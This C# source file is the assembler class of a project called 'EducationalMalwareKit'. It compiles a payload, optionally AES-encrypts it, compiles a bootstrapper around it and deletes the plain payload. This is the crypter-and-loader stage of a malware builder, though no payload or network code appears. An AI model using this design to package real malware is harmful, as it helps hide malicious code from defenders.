using System;
using System.IO;
using EducationalMalwareKit.Assembler.Encryption;
using EducationalMalwareKit.Domain.Build;

namespace EducationalMalwareKit.Assembler.Assemblers
{
    public class CsharpAssembler : IMalwareAssembler
    {
        private MalwareBuild _malwareBuild;

        public IMalwareAssembler Init(MalwareBuild malwareBuild)
        {
            _malwareBuild = malwareBuild;
            return this;
        }

        public void AssembleMalware()
        {
            var sourceCode = TemplateHandler.PrepareTemplate(_malwareBuild);

            FileHandler.CopyPayloadToWorkingDir(_malwareBuild);
            FileHandler.SetDependencyPaths(_malwareBuild);

            CommandLineHandler.Init(_malwareBuild).CompilePayload();

            var payloadPath = Path.Combine(_malwareBuild.WorkingDir, _malwareBuild.PayloadFileName);

            if (_malwareBuild.UserOptions.EncryptPayload)
            {
                var encryptedPayloadPath =
                    SimpleAES.EncryptFile
                    (
                        payloadPath,
                        _malwareBuild.UserOptions.EncryptionKeyBytes,
                        _malwareBuild.UserOptions.EncryptionSaltBytes
                    );

                _malwareBuild.CompiledPayloadPath = encryptedPayloadPath;
            }
            else
            {
                _malwareBuild.CompiledPayloadPath = payloadPath;
            }

            FileHandler.WriteMainClassToFileAsync(_malwareBuild, sourceCode);
            CommandLineHandler.Init(_malwareBuild).CompileBootstrapper();

            File.Delete(payloadPath);
        }

        public void CleanWorkingDir()
        {
            FileHandler.CleanDirectory(_malwareBuild.WorkingDir, ".exe");
        }

        public void CompressOutput(string packagerPath)
        {
            throw new NotImplementedException();
        }
    }
}
